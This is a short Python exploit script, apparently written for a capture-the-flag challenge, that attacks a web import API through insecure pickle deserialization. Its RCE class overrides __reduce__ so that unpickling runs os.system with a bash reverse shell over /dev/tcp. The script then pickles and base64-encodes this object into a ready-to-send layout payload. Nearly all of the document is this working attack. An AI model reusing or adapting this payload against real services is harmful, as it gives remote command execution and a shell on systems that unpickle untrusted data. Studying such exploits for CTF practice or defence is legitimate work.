import pickle
import requests
import base64
import os


def normal_usage(debug=True):
    '''
    this gets accepted by the import api
    '''
    print('normal layout:\n')
    url = 'http://ctf.adl.tw:12004/api/import'
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}
        
    ]
    print("typeof mylayout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return
    myobj={'layout':my_layout}

    r = requests.post(url, json = myobj)
    
    return


class RCE:
    def __reduce__(self):
        dest_ip='127.0.0.1'
        dest_port='8080'
        cmd='bash -c \"bash &>/dev/tcp/%s/%s <&1\"'%(dest_ip,dest_port)
        
        return os.system, (cmd,)
        

def payload():
    
    print('payload layout:\n')
    

    my_layout=RCE()

    print("typeof my_layout:",type(my_layout))
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)




   


#normal_usage()
payload()
